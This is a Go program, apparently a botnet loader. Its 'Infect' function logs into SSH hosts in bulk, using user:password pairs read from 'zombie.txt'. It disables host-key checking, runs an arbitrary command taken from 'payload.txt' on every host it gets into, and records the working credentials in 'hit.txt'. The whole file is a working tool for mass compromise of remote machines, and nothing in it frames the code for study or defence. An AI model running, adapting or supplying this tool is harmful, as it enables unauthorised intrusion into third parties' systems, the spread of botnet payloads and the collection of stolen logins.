package main

import (
	"bufio"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"golang.org/x/crypto/ssh"
)

var (
	payload = ReadLine("payload.txt")[0]
)

func ReadLine(path string) []string {
	var lines []string

	file, err := os.Open(path)
	if err != nil {
		panic(err)
	}

	defer file.Close()
	scanner := bufio.NewScanner(file)

	scanner.Split(bufio.ScanLines)

	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines
}

func Infect(ip string, port string, user string, pass string) {
	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.Password(pass)},
	}
	sshConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%s", ip, port), sshConfig)
	if err != nil {
		fmt.Printf("--> can't connect %s:%s\n", user, ip)
		return
	}

	session, err := client.NewSession()
	if err != nil {
		fmt.Printf("--> invalid %s:%s\n", user, ip)
		client.Close()
		return
	}

	defer session.Close()
	
	err = session.Run(payload)

	if err != nil {
		fmt.Printf("--> can't send command %s:%s\n", user, ip)
		client.Close()
		return
	}
	
	fmt.Printf("--> sent %s:%s\n", user, ip)

	// append to file
	file, err := os.OpenFile("hit.txt", os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}

	defer file.Close()

	if _, err = file.WriteString(fmt.Sprintf("%s:%s:%s:%s\n", user, ip, port, pass)); err != nil {
		panic(err)
	}
	
	client.Close()
}

func main() {
	combo := ReadLine("zombie.txt")

	for _, line := range combo {
		parsed := strings.Split(line, ":")
		go Infect(parsed[1], parsed[2], parsed[0], parsed[3])
	}

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc
}